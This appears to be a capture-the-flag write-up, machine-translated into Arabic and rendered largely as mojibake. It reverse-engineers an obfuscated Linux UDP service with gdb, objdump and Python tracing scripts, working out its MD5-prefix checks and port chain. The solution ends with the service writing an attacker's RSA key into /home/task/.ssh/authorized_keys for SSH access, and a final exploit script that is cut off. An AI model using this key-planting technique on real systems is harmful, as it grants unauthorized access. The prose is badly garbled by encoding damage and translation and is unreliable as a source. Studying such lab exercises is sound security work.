,     OF        ยซxorยป, ยซandยป  . </li><li style=";text-align:right;direction:rtl"> ,       .            .      ,  : <br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">95b401: c7 04 25 2b b4 95 00 mov DWORD PTR ds:0x95b42b,0x34be74 95b408: 74 be 34 00 95b40c: 66 c7 04 25 01 b4 95 mov WORD PTR ds:0x95b401,0x13eb 95b413: 00 eb 13 95b416: 4c 0f 44 da cmove r11,rdx 95b41a: 48 d1 ea shr rdx,1 95b41d: 48 0f 44 ca cmove rcx,rdx 95b421: 49 89 d3 mov r11,rdx 95b424: 48 89 ca mov rdx,rcx 95b427: 4c 89 da mov rdx,r11 95b42a: e9 8d ad e7 00 jmp 17d61bc</code> </pre> </li><li style=";text-align:right;direction:rtl">  ,      . </li></ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุจูุงุกู ุนูู ูุชุงุฆุฌ ุงูุงุชุฌุงู ุงููุนุงูุณ ุ ุชู ุงูุชุฑุงุถ ูุฌูุฏ ุชุทุจูู ูุญุณุงุจ ููููุง ูุฎูุงุฑุฒููุฉ MD5. ูุง ูุชู ุชูููุฐ ุงูุฌุฏูู ุงูุถุฑูุฑู ููุญุณุงุจ ุจุดูู ูููุตู ุ ูููู ุชุชู ูุฑุงุกุชู ูุจุงุดุฑุฉู ูู ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ูู ุงููุชู. ุชุญุชูู ุงูุชุนูููุฉ ุงูุจุฑูุฌูุฉ ุนูู ุฃุญุฑู ุจุฃุณูุงุก </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Init</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ู </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Update</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ู </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_final</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุจุดูู ุนุงู ุ ุจุงุณุชุฎุฏุงู ุฅููุงูุงุช ุฃุฏุงุฉ ูู ุงูุดูุฑุฉ ุงููุนุฑููุฉ ููุตูุต API ุงูุฎุงุตุฉ ุจู ุ ูุงู ูู ุงููููู ุชุญุฏูุฏ ุชูุฏู ุงูุจุฑูุงูุฌ ุจุดูู ุซุงุจุช. ููู ุชุฑุฎูุต ุฃุฏุงุฉ ูู ุงูุดูุฑุฉ ูููู ุ ูุงูุฅุตุฏุงุฑ ุงูุชุฌุฑูุจู ุฃูุฑ ูุญุฒู ุ ููู ุงูุตุนุจ ุงูุญุตูู ุนููู ุ ูุชูููุช ูู ุงุณุชุฎุฏุงู ุฃุฏูุงุช ูุณุงุนุฏุฉ ูุฌุงููุฉ ุ ูุจูุฐู ุงูุทุฑููุฉ ุฃุทูู ูู ุฐูู. ูุฐูู ุ ุฏููุงููุงุช ูุฃูุซุฑ ูุฑุตุฉ. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ููุช ุจุชุญููู ููู ELF ุนูู ุงูุฌูุงุฒ ุงูุธุงูุฑู. ุฃูุดุฆ ุงูุฏููู "/home/task/.ssh/" ููุท ูู ุงูุญุงูุฉ.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุนูุฏ ุจุฏุก ุงูุชุดุบูู ุ ูุฌุจ ุนููู ุชุญุฏูุฏ ุงููููุฐ. </font><font style="vertical-align: inherit;">ุงููุธุฑ ูู ุฃููุง ูุง ูุชุญูู ูู ุฅุทูุงู ุฌุงูุจ ุงูุฎุงุฏู ุ ูุฃุนุชูุฏ ุฃู ูุฐู ุงููุนููุฉ ูุงูุช ููููุฉ. </font><font style="vertical-align: inherit;">ูุฌุจ ุฃู ูููู ุงููููุฐ ุงูุญูููู ูุงุญุฏูุง. </font><font style="vertical-align: inherit;">ุฃุธูุฑ Netstat ุงููููุฐ ุงูููุชูุญ 5432 (UDP).</font></font><br><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># netstat -ulnp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name udp 0 0 0.0.0.0:5432 0.0.0.0:* 13611/./UwRJ8iaEEd4</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ุฅุฑุณุงู ุญุฒูุฉ ูุน ุงูุจูุงูุงุช ุฅูู ุงููููุฐ ุงููุญุฏุฏ ูุนุฑุถ ุฑุณุงูุฉ ุญูู ุงูุชุญูู ูููุง ูุจุนุถ ุงูุจูุงูุงุช (4 ุจุงูุช) ูู ุงูุฎุฏูุฉ: </font></font><br><pre style=";text-align:right;direction:rtl"> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#echo "test" &gt; /dev/udp/127.0.0.1/5432 # Verifying 74657374 009ec3b8</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูุดู ุชุนุฏุงุฏ ุงูุจูุงูุงุช ุงููุฎุชููุฉ ุนูู ุงุนุชูุงุฏ ุงูุฅุฎุฑุงุฌ ุนูู ูุญุชููุงุชูุง. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุงูุชุงูู ูู ุชุตุญูุญ ุงูุฃุฎุทุงุก ุจุงุณุชุฎุฏุงู gdb. </font><font style="vertical-align: inherit;">ุจุงุฏุฆ ุฐู ุจุฏุก ุ ุฃุฌุฏ ูู ุฃูู ูุญุตู ุนูู ุงูุจูุงูุงุช ุ ูููุทุฉ ุชููู ุนูู recvfrom ู backtrace. </font><font style="vertical-align: inherit;">ูุญุตู ุนูู ุนููุงู 0x6ae010 ูู ุงูููุงูุฉ.</font></font><br><br><div class="spoiler" style=";text-align:right;direction:rtl"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุณูุณูุฉ ุงูุงูุชูุงู</font></font></b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">6ae00b: e8 d0 2b d5 ff call 400be0 &lt;recvfrom@plt&gt; 6ae010: e9 64 bc ea ff jmp 559c79 &lt;MD5_Update@@Base+0x953fc&gt; 559c79: 89 45 80 mov DWORD PTR [rbp-0x80],eax 559c7c: 83 f8 ff cmp eax,0xffffffff <span class="hljs-comment"><span class="hljs-comment">#   ,  -1 559c7f: 0f 84 62 7f 1c 00 je 721be7 &lt;MD5_Final@@Base+0x9e933&gt; 559c85: e9 8a d6 2c 00 jmp 827314 &lt;MD5_Final@@Base+0x1a4060&gt; 827314: 48 c7 c7 30 d1 f0 00 mov rdi,0xf0d130 82731b: 48 29 27 sub QWORD PTR [rdi],rsp 82731e: 48 89 df mov rdi,rbx 827321: e8 5f 94 fe ff call 810785 &lt;MD5_Final@@Base+0x18d4d1&gt; 827326: e9 d7 a5 2d 00 jmp b01902 &lt;MD5_Init@@Base+0x7569&gt; b01902: 85 c0 test eax,eax b01904: 0f 84 dd 02 c2 ff je 721be7 &lt;MD5_Final@@Base+0x9e933&gt; b0190a: e9 7c a9 bb ff jmp 6bc28b &lt;MD5_Final@@Base+0x38fd7&gt;</span></span></code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูู ุงูุณูุณูุฉ ุ ุงุณุชุฏุนุงุก ุงูุฏุงูุฉ ูู 0x810758 ููุนุงูุฌุฉ ูุชุงุฆุฌูุง. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุชุนููู ูุงุตู ุฅูู 0xb01902 ุ ูุฅุฑุณุงู ุญุฒูุฉ ุงูุจูุงูุงุช.</font></font><br><br><div class="spoiler" style=";text-align:right;direction:rtl"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุฑูุฒ ุงูุฅุฑุฌุงุน (ุณุฌู rax)</font></font></b> <div class="spoiler_text" style=";text-align:right;direction:rtl"> (gdb) b *0xb01902 <br> Breakpoint 2 at 0xb01902 <br> (gdb) c <br> Continuing. <br> Verifying 74657374 <br> 00f82488 <br><br> Breakpoint 2, 0x0000000000b01902 in MD5_Init () <br> (gdb) info reg rax <br> rax 0x0 0 <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุฑูุฒ 0 ููุจูุงูุงุช ุบูุฑ ุตุงูุญุฉ. ูุฐูู ุ ููุชุฑุถ ุฃูู ุจุงููุณุจุฉ ููุญู ุงูุตุญูุญ ุ ูุญุชุงุฌ ุฅูู ุฅุฑุฌุงุน ุงูููุฏ ูููุณ 0. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูู ุณูุงู ุฅุฌุฑุงุก ูุฒูุฏ ูู ุงูุฃุจุญุงุซ ุ ูุธุฑุช ูู gdb ุ ูุงูุฐู ูุชู ุชูุฑูุฑู ุฅูู ูุธููุฉ </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD5_Update</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ุนูุฏ ุฅุฑุณุงู ุญุฒูุฉ ุงูุจูุงูุงุช (ููุง ุชู ุฅุฑุณุงู "ุงุฎุชุจุงุฑ").</font></font><br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ุงููุชูุฌุฉ</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="bash hljs">(gdb) b MD5_Update Breakpoint 3 at 0x4c487d (2 locations) (gdb) c Continuing. Verifying 74657374 Breakpoint 3, 0x00000000004c487d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> MD5_Update () (gdb) info reg rsi rsi 0x7fffffffdd90 140737488346512 (gdb) x/20bx <span class="hljs-variable"><span class="hljs-variable">$rsi</span></span> 0x7fffffffdd90: 0x74 0x65 0x73 0x74 0x0a 0xff 0x7f 0x00 0x7fffffffdd98: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdda0: 0x00 0x00 0x00 0x00 (gdb) info reg <span class="hljs-variable"><span class="hljs-variable">$rdx</span></span> rdx 0x200 512</code> </pre> <br></div></div><br><h4 style=";text-align:right;direction:rtl">  ุงููุชูุฌุฉ </h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูุชู ุญุณุงุจ MD5 ูู ุงูุฑุณุงูุฉ ุงูุชู ุฃุฑุณููุงูุง ุ ูููู ุญุฌู ุงูุจูุงูุงุช ุงูุชู ูุชู ูุฑุงุกุชูุง ูู 512 ุจุงูุช. ุจุนุฏ ุฃู ูุนุจุช ูุน ุงูุจูุงูุงุช ุ ุงูุชุดูุช ุฃูู ูุชู ุญุณุงุจ MD5 ูู ุงูุจูุงูุงุช ุงููุฑุณูุฉ ูุน ุงูุฃุตูุงุฑ ุงูุชู ุชููุฃ ุญุชู 512 ุจุงูุช. ููู ุนููู ุฅุฑุณุงู 8 ุจุงูุช ุนูู ุงูุฃูู ูุงุณุชุจุฏุงู ุนุฏุฏ 8 ุจุงูุช ุงููุฎุฒู ุนูู ุงูููุฏุณ. ุนูู ูุง ูุจุฏู ุ ุชู ุชุฎุฒูู ุจุนุถ ุงูุนููุงู ููุงู. ุชุชูุงูู ูุญุฏุงุช ุงูุจุงูุช ุงูุฃุฑุจุน ุงููุนุฑูุถุฉ ุจูุงุณุทุฉ ุงูุฎุฏูุฉ ููู ุญุฒูุฉ ูุงุฑุฏุฉ ูุน ุงูุจุงูุชุงุช ุงูุซูุงุซุฉ ุงูุฃููู ูู ูุฌููุน MD5 ูุน ุตูุฑ ุฅุถุงูู. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุนุฏุช ุฅูู ุงูุฏุงูุฉ 0x810758 ูุฑูุฒ ุงูุฅุฑุฌุงุน ุงูุฎุงุต ุจูุง 0. ูุชู ุชุฎุฒูู ูููุฉ ุงูุฅุฑุฌุงุน ูู ุณุฌู RAX. ูุชุญุฏูุฏ ุฑูุฒ ุงูุฅุฑุฌุงุน ุ ููุช ุจุชุนููู ููุทุชู ุชููู ุนูู ุนููุงู ุงููุธููุฉ 0x810758 ูุงูุนููุงู ุจุนุฏ ุชูููุฐูุง 0x827326. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ููุฏ ุฃุฑุณูุช ุงูุจูุงูุงุช ุ ุนููุช ุงูููุทุฉ ูู 0x810758. ุฃุทููุช ุงูุจุฑูุงูุฌ ุงููุตู ูู gdb:</font></font><br><br><pre style=";text-align:right;direction:rtl"> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> gdb <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(<span class="hljs-string"><span class="hljs-string">"flow.log"</span></span>, <span class="hljs-string"><span class="hljs-string">"w"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fw: <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>: s = gdb.execute(<span class="hljs-string"><span class="hljs-string">"info reg rip"</span></span>, to_string=<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) s = s[s.find(<span class="hljs-string"><span class="hljs-string">"0x"</span></span>):] gdb.execute(<span class="hljs-string"><span class="hljs-string">"ni"</span></span>, to_string=<span class="hljs-keyword"><span class="hljs-keyword">True</span></span>) address = s.split(<span class="hljs-string"><span class="hljs-string">"\t"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>].strip() fw.write(address + <span class="hljs-string"><span class="hljs-string">"\r\n"</span></span>) address = int(address, <span class="hljs-number"><span class="hljs-number">16</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> address == <span class="hljs-number"><span class="hljs-number">0x827326</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">break</span></span></code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุญุตูุช ุนูู ููู </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">flow.log</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ูุน ูู ุงูุนูุงููู ุงูุชู ุชู ุชูุฑูุฑูุง ุฃุซูุงุก ุชูููุฐ ุงููุธููุฉ ููุฏ ุงูุฏุฑุงุณุฉ. </font><font style="vertical-align: inherit;">ูู ุงููุงูุน ุ ูู ููู ุงูุฃูุฑ ุจูุฐู ุงูุจุณุงุทุฉ ุ ููู ูู ุงูููุงูุฉ ุฌุฆุช ุฅูู ูุฐุง. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุฃุนุฏ ููู " </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">disasm.log</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> " ุจุฑูุฒ ูููู ูู objdmp ูููุน ูุงุจู ูููุฑุงุกุฉ ูุซู " </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">address: instruction</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> " ุจุฏูู ุฃุณุทุฑ ุฅุถุงููุฉ.</font></font><br><br><div class="spoiler" style=";text-align:right;direction:rtl"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุฃุทููุช ูุซู ูุฐุง ุงูุณููุงุฑูู</font></font></b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="python hljs">F_NAME = <span class="hljs-string"><span class="hljs-string">"disasm.log"</span></span> F_FLOW = <span class="hljs-string"><span class="hljs-string">"flow.log"</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">prepare_code_flow</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(f_path)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> open(f_path, <span class="hljs-string"><span class="hljs-string">"rb"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> fr: data = fr.readlines() data = filter(<span class="hljs-keyword"><span class="hljs-keyword">lambda</span></span> x: x, data) start_address = long(data[<span class="hljs-number"><span class="hljs-number">0</span></span>].split(<span class="hljs-string"><span class="hljs-string">":"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) end_address = long(data[<span class="hljs-number"><span class="hljs-number">-1</span></span>].split(<span class="hljs-string"><span class="hljs-string">":"</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>], <span class="hljs-number"><span class="hljs-number">16</span></span>) res = [<span class="hljs-string"><span class="hljs-string">""</span></span>] * (end_address - start_address + <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _d <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> data: _d = _d.split(<span class="hljs-string"><span class="hljs-string">":"</span></span>) res[long(_d[<span class="hljs-number"><span class="hljs-number">0</span></span>].strip(), <span class="hljs-number"><span class="hljs-number">16</span></span>) - start_address] = <span class="hljs-string"><span class="hljs-string">""</span></span>.join(_d[<span class="hljs-number"><span class="hljs-number">1</span></span>:]).strip() <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> start_address, res <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parse_instruction</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(code)</span></span></span><span class="hljs-function">:</span></span> mnem = code[:<span class="hljs-number"><span class="hljs-number">7</span></span>].strip() ops = code[<span class="hljs-number"><span class="hljs-number">7</span></span>:].split(<span class="hljs-string"><span class="hljs-string">","</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> [mnem] + ops <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">process_instruction</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(code)</span></span></span><span class="hljs-function">:</span></span> parse_data = parse_instruction(code) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> parse_data[<span class="hljs-number"><span class="hljs-number">1</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> [<span class="hljs-string"><span class="hljs-string">"rax"</span></span>, <span class="hljs-string"><span class="hljs-string">"eax"</span></span>, <span class="hljs-string"><span class="hljs-string">"al"</span></span>]: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">True</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">False</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> __name__ == <span class="hljs-string"><span class="hljs-string">'__main__'</span></span>: <span class="hljs-comment"><span class="hljs-comment"># Prepare disassemble data start_address, codes = prepare_code_flow(F_NAME) with open(F_FLOW, "rb") as fr: lines = fr.readlines() lines.reverse() lines = filter(lambda x: x, lines) count = 0 for _l in lines: offset = long(_l.strip(), 16) - start_address if process_instruction(codes[offset]): print str(count) + " " + hex(offset + start_address) + " " + codes[offset] break count += 1 continue</span></span></code> </pre> <br><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ุงูุจุฑูุงูุฌ ุงููุตู ุจุจุณุงุทุฉ "ููุชูู" ุฅูู ุงูุนูุงููู ูุฑุฉ ุฃุฎุฑู ูู ุงูููุงูุฉ ุญุชู ุงููุญุธุฉ ุงูุชู ูุชููู ูููุง ุณุฌู RAX ูู ุงููุนุงูู ุงูุฃูู ููุชุนูููุงุช. </font></font> ุงููุชูุฌุฉ: <br> <code>0x67c27c mov DWORD PTR [rbp-0x14], 0x0</code> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ููุง ูู ูููุฉ ุงูุตูุฑ. </font><font style="vertical-align: inherit;">ุจุนุฏ ุฐูู ุ ููุท ุนุฏ ุฅูู ุฃู ูุฑุน (ููู " </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">flow.log</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> "):</font></font><br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">95b6ad: jmp 73d0d1 &lt;MD5_Final@@Base+0xb9e1d&gt; 95b6b2: cmp DWORD PTR [rbp-0x2d4],0x133337 95b6bc: jne 67c270 &lt;MD5_Update@@Base+0x1b79f3&gt;</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุงูุนููุงู 0x95b6b2 ูู ููุงุฑูุฉ ููููุฉ ูุนููุฉ ูุน 0x133337. </font><font style="vertical-align: inherit;">ููุทุฉ ุชููู ุ ุงูุธุฑ ุฅูู [rbp-0x2d4]. </font><font style="vertical-align: inherit;">ููููุงู ุจุฐูู ุ ุฃุฑุณู ุงูุญุฒูุฉ ูุน ุงูุจูุงูุงุช "ุงุฎุชุจุงุฑ":</font></font><br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs"># echo -n "testtest" &gt; md5.bin # truncate -s 512 md5.bin # md5sum md5.bin e9b9de230bdc85f3e929b0d2495d0323 md5.bin # echo -n "testtest" &gt; /dev/udp/127.0.0.1/5432 (gdb) b *0x95b6b2 Breakpoint 6 at 0x95b6b2 (gdb) c Continuing. Verifying 74657374 00deb9e9 Breakpoint 6, 0x000000000095b6b2 in MD5_Final () (gdb) x/20bx $rbp-0x2d4 0x7fffffffdd7c: 0xe9 0xb9 0xde 0x00 0xe9 0xb9 0xde 0x23 0x7fffffffdd84: 0x0b 0xdc 0x85 0xf3 0xe9 0x29 0xb0 0xd2 0x7fffffffdd8c: 0x49 0x5d 0x03 0x23</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุชุทุงุจู ุฃูู 3 ุจุงูุช ูู ูุฌููุน MD5. ูููู ุงูุญู ูู ุงูุญุตูู ุนูู ูุฌููุน MD5 ูุน ุฃูู 3 ุจุงูุช "\ x37 \ x33 \ x13". </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุจุฑูุงูุฌ ูุตู ุจุณูุท ููุชูุฑุงุฑ ุนูู ุงูุฃุฑูุงู ูู ุงูุตูุฑ ูุน ุงูุญุณุงุจ ูู ุดูู ุซูุงุฆู MD5 ุฅูู ุงููุทุงุจูุฉ ุงููุทููุจุฉ. ุงูุจูุงูุงุช ุงููุทููุจุฉ ูุฅุฑุณุงู ุงููุณุชููุฉ. ูุฑุณู ุงูุจูุงูุงุช ููุชููู ุฑุณุงูุฉ ูู ุงูุฎุฏูุฉ ุญูู ุชุนููู ูููุฐ ุฌุฏูุฏ ูุชููู ุงูุจูุงูุงุช:</font></font><br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">New salt 508bd11b Next port 14235 Binding 14235 Waiting for data...3 14235 0</code> </pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูู Netstat ูุง ุชุธูุฑ ูุฐุง ุงููููุฐ ุ ูููุงูุฐ ุฌุฏูุฏุฉ ุจุงููุนู. ููู ููุงุญุธุฉ ุฃุธูุฑุช ูุฌูุฏ ุนูููุฉ ุฅููุงุก ุงูุทูู (ุงูุฒููุจู). ุฌุงุกุช ุงูููุฑุฉ ุฃู ุงููููุฐ ููุชุญ ููุชุฑุฉ ูู ุงูููุช ูู ุงูุนูููุฉ ุงููุฑุนูุฉ. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ููุฏ ุฃุฑุณูุช ุงูุญุฒูุฉ ุงูุถุฑูุฑูุฉ ุฅูู ุงููููุฐ 5432 ุ ูุจุนุฏ ุฐูู ุฅูู ูููุฐ 14235. ููุง ุดูุก. ุชููู ุงููููุฐ ุนู ุงููุชุญ. ูุชูุฌุฉ ูุฐูู ุ ููุช ุจุฅูุดุงุก ุจูุงูุงุช ุฃุฎุฑู ุ ูุจุงูุชุงูู ุ MD5 ูุน ุงูุจุฏุงูุฉ ุงูุตุญูุญุฉ. ุงูุฑุณุงูุฉ ูุฑุฉ ุฃุฎุฑู ุ ูููู ูุฐู ุงููุฑุฉ ูุน ูููุฐ ูุฎุชูู. ุจุนุฏ ุฅุนุงุฏุฉ ุชุดุบูู ุงูุฎุฏูุฉ ุ ูุงู ุฃูู MD5 ูุนูู ุ ูุฑุฉ ุฃุฎุฑู ูุน ุงููููุฐ 14235. ูุงู ููุงู ููุฑุฉ ุฃู ุงูุฎุฏูุฉ ุชุชุฐูุฑ MD5 ุงููุณุชููู. ูุฐูู ุ ุงุฎุชุจุฑุช ุฐูู ูู ูู ูุฑุฉ ุฃุนูุฏ ูููุง ุชุดุบูู ุงูุฎุฏูุฉ.</font></font><br><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ุงููุชูุฌุฉ</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">Binding 22 Waiting for data...Verifying 1BFFFFFFD1FFFFFF8B50 00133337 New salt 508bd11b Next port 14235 Binding 14235 Waiting for data...Received packet from 127.0.0.1:43614 Data: 3 14235 27 Next port 23038 Binding 23038 Waiting for data...4</code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูุฑุฉ ุฃุฎุฑู ูููุงุก ุฌุฏูุฏ. ููุง ุจุฏุฃุช ุฃุนุชูุฏ ุฃู ุณูุณูุฉ ุงูููุงูุฆ ูุฏ ุชููู ุทูููุฉ ... </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูู ุงููุงูุน ุ ูุงู ุงููููุฐ ุงูุชุงูู (31841) ูู ุงูุฃุฎูุฑ. ุจุนุฏ ูุถุงุก ุจุนุถ ุงูููุช ูู ุงูุนูู ูุน gdb ูุงูุฑูุฒ ุงููููู ูุงุฎุชุจุงุฑุงุช ูุชููุนุฉ ุ ุงูุชุดูุช ุธููุฑ ุงูููู "/home/task/.ssh/authorized_keys". </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุฃุตุจุญ ุงูุชุดุงู ุงููุฒูุฏ ูู ุณุจุจ ุธููุฑ ุงูููู ูุณุฃูุฉ ููุช ุ ูุง ูู ููุชูุจ ููุฐุง ุงูููู ุฃูุถุง. ูุชูุฌุฉ ูุฐูู ุ ุชุชู ูุชุงุจุฉ ุจูุงูุงุช ุงูุญุฒูุฉ ุงููุฑุณูุฉ ูู ุฃุนูุงุจ ุฃูู ูููุฐ ุฅูู ุขุฎุฑ ูููุฐ ููุชูุญ ุฅูู ุงูููู (ุฅุฐุง ูู ููู ูุงุถุญูุง ุ ูุณูุชู ุนุฑุถู ูู ุงูุจุฑูุงูุฌ ุงููุตู ุฃุฏูุงู). </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูุฒูุฏ ูู ุฌูู ูู ููุงุชูุญ RSA ูุฅุฑุณุงู ุงูุฌูููุฑ. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุซู ุฅุฐู ุนูู ุงูุฎุงุฏู ุนุจุฑ SSH ุ ุงุจุญุซ ูุงูุญุตูู ุนูู ุงูุนูู.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูู ุนูููุฉ ุงูุชุทุจูู ุ ููุท ุงููุจูุบ MD5 ุงูุฐู ุชู ุฅูุดุงุคู ูู ุงูุซุงูุซ ุจุงููุณุจุฉ ูู. </font><font style="vertical-align: inherit;">ุจุนุฏ ุงูุงูุชูุงุก ูู ุงููููุฉ ุ ุงูุชุดูุช ูู ุฎูุงู ูุชุงุฆุฌ ุงูุนูุณ ุฃู ุงููุจูุบ ุงูุซุงูุซ ูู ุงูุญูููุฉ ุณูุนูู ุฏุงุฆููุง (ุฃู ุจุงูุฃุญุฑู ุ ูุจู ุงูุชูุงุก ุตูุงุญูุฉ ุนุฏุงุฏ ูุนูู). </font><font style="vertical-align: inherit;">ููู ูุนูู ุงููุฌููุน ุจุดูู ูุณุชูุฑ ุ ูู ุงูุถุฑูุฑู ุฃู ูููู ุนุฏุฏ ุตุญูุญ ุงูููุน int ุงููุฑุณูุฉ ูู ุงูุจุงูุชุงุช ุงูุฃุฑุจุน ุงูุฃููู ูู ุจูุงูุงุช ุงูุฑุฒูุฉ (ุงูุชู ููุนุชุจุฑ ูููุง MD5) ุณุงูุจูุง ุ ุฃู ุฃูู ุชู ุถุจุท ุงูุจุชุฉ ุงูุฃููู ูู ุงูุจุงูุชุฉ ุงูุฑุงุจุนุฉ (ุชุฑุชูุจ ุงูุจุงูุช ุงูุนูุณู).</font></font><br><br><div class="spoiler" style=";text-align:right;direction:rtl"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ููุฌุฏ ุฃุฏูุงู ุงููุต ุงููุณุชุฎุฏู ูููู ููุชุงุญ RSA ุนูุฏ ุญู ุงููุดููุฉ.</font></font></b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> socket <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> time <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> SocketServer <span class="hljs-keyword"><span 